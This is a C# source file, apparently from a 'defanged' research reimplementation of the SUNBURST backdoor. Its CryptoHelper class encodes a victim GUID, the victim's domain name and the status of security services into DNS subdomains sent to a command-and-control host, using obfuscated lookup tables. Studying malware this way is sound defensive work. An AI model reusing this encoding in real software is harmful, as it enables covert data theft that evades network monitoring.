using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SunBurstDefanged
{
	public class CryptoHelper
	{
		private const int dnSize = 32;

		private const int dnCount = 36;

		private readonly byte[] guid;

		private readonly string dnStr;

		private string dnStrLower;

		private int nCount;

		private int offset;

		public CryptoHelper(byte[] userId, string domain)
		{
			this.guid = userId.ToArray<byte>();
			this.dnStr = CryptoHelper.DecryptShort(domain);
			this.offset = 0;
			this.nCount = 0;
		}

		private static string Base64Decode(string s)
		{
			// rq3gsalt6u1iyfzop572d49bnx8cvmkewhj
			string text = ZipHelper.Unzip("Kyo0Ti9OzCkxKzXMrEyryi8wNTdKMbFMyquwSC7LzU4tz8gCAA==");
			// 0_-.
			string text2 = ZipHelper.Unzip("M4jX1QMA");
			string text3 = "";
			Random random = new Random();
			foreach (char value in s)
			{
				int num = text2.IndexOf(value);
				text3 = ((num < 0) ? (text3 + text[(text.IndexOf(value) + 4) % text.Length].ToString()) : (text3 + text2[0].ToString() + text[num + random.Next() % (text.Length / text2.Length) * text2.Length].ToString()));
			}
			return text3;
		}

		private static string Base64Encode(byte[] bytes, bool rt)
		{
			// ph2eifo3n5utg1j8d94qrvbmk0sal76c
			string text = ZipHelper.Unzip("K8gwSs1MyzfOMy0tSTfMskixNCksKkvKzTYoTswxN0sGAA==");
			string text2 = "";
			uint num = 0U;
			int i = 0;
			foreach (byte b in bytes)
			{
				num |= (uint)((uint)b << i);
				for (i += 8; i >= 5; i -= 5)
				{
					text2 += text[(int)(num & 31U)].ToString();
					num >>= 5;
				}
			}
			if (i > 0)
			{
				if (rt)
				{
					num |= (uint)((uint)new Random().Next() << i);
				}
				text2 += text[(int)(num & 31U)].ToString();
			}
			return text2;
		}

		private static string CreateSecureString(byte[] data, bool flag)
		{
			byte[] array = new byte[data.Length + 1];
			array[0] = (byte)new Random().Next(1, 127);
			if (flag)
			{
				byte[] array2 = array;
				int num = 0;
				array2[num] |= 128;
			}
			for (int i = 1; i < array.Length; i++)
			{
				array[i] = (byte)(data[i - 1] ^ array[0]);
			}
			return CryptoHelper.Base64Encode(array, true);
		}

		private static string CreateString(int n, char c)
		{
			if (n < 0 || n >= 36)
			{
				n = 35;
			}
			n = (n + (int)c) % 36;
			if (n < 10)
			{
				return ((char)(48 + n)).ToString();
			}
			return ((char)(97 + n - 10)).ToString();
		}

		private static string DecryptShort(string domain)
		{
			// 0123456789abcdefghijklmnopqrstuvwxyz-_.
			if (domain.All((char c) => ZipHelper.Unzip("MzA0MjYxNTO3sExMSk5JTUvPyMzKzsnNyy8oLCouKS0rr6is0o3XAwA=").Contains(c)))
			{
				return CryptoHelper.Base64Decode(domain);
			}
			return "00" + CryptoHelper.Base64Encode(Encoding.UTF8.GetBytes(domain), false);
		}

		private string GetStatus()
		{
			Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - GetStatus() return new C2 host ." + Settings.domain2 + "." + Settings.domain3[(int)this.guid[0] % Settings.domain3.Length] + "." + Settings.domain1);
			return string.Concat(new string[]
			{
					".",
					Settings.domain2,
					".",
					Settings.domain3[(int)this.guid[0] % Settings.domain3.Length],
					".",
					Settings.domain1
			});
		}

		private static int GetStringHash(bool flag)
		{
			return ((int)((DateTime.UtcNow - new DateTime(2010, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalMinutes / 30.0) & 524287) << 1 | (flag ? 1 : 0);
		}

		private byte[] UpdateBuffer(int sz, byte[] data, bool flag)
		{
			byte[] array = new byte[this.guid.Length + ((data != null) ? data.Length : 0) + 3];
			Array.Clear(array, 0, array.Length);
			Array.Copy(this.guid, array, this.guid.Length);
			int stringHash = CryptoHelper.GetStringHash(flag);
			array[this.guid.Length] = (byte)((stringHash & 983040) >> 16 | (sz & 15) << 4);
			array[this.guid.Length + 1] = (byte)((stringHash & 65280) >> 8);
			array[this.guid.Length + 2] = (byte)(stringHash & 255);
			if (data != null)
			{
				Array.Copy(data, 0, array, array.Length - data.Length, data.Length);
			}
			for (int i = 0; i < this.guid.Length; i++)
			{
				byte[] array2 = array;
				int num = i;
				array2[num] ^= array[this.guid.Length + 2 - i % 2];
			}
			return array;
		}

		public string GetNextStringEx(bool flag)
		{
			byte[] array = new byte[(Settings.svcList.Length * 2 + 7) / 8];
			Array.Clear(array, 0, array.Length);
			for (int i = 0; i < Settings.svcList.Length; i++)
			{
				int num = Convert.ToInt32(Settings.svcList[i].stopped) | Convert.ToInt32(Settings.svcList[i].running) << 1;
				byte[] array2 = array;
				int num2 = array.Length - 1 - i / 4;
				array2[num2] |= Convert.ToByte(num << i % 4 * 2);
			}
			return CryptoHelper.CreateSecureString(this.UpdateBuffer(2, array, flag), false) + this.GetStatus();
		}

		public string GetNextString(bool flag)
		{
			return CryptoHelper.CreateSecureString(this.UpdateBuffer(1, null, flag), false) + this.GetStatus();
		}

		public string GetPreviousString(out bool last)
		{
			string text = CryptoHelper.CreateSecureString(this.guid, true);
			int num = 32 - text.Length - 1;
			string result = "";
			last = false;
			if (this.offset >= this.dnStr.Length || this.nCount > 36)
			{
				return result;
			}
			int num2 = Math.Min(num, this.dnStr.Length - this.offset);
			this.dnStrLower = this.dnStr.Substring(this.offset, num2);
			this.offset += num2;
			// -_0
			if (ZipHelper.Unzip("0403AAA=").Contains(this.dnStrLower[this.dnStrLower.Length - 1]))
			{
				if (num2 == num)
				{
					this.offset--;
					this.dnStrLower = this.dnStrLower.Remove(this.dnStrLower.Length - 1);
				}
				this.dnStrLower += "0";
			}
			if (this.offset >= this.dnStr.Length || this.nCount > 36)
			{
				this.nCount = -1;
			}
			result = text + CryptoHelper.CreateString(this.nCount, text[0]) + this.dnStrLower + this.GetStatus();
			if (this.nCount >= 0)
			{
				this.nCount++;
			}
			last = (this.nCount < 0);
			return result;
		}

		public string GetCurrentString()
		{
			string text = CryptoHelper.CreateSecureString(this.guid, true);
			return text + CryptoHelper.CreateString((this.nCount > 0) ? (this.nCount - 1) : this.nCount, text[0]) + this.dnStrLower + this.GetStatus();
		}
	}
}
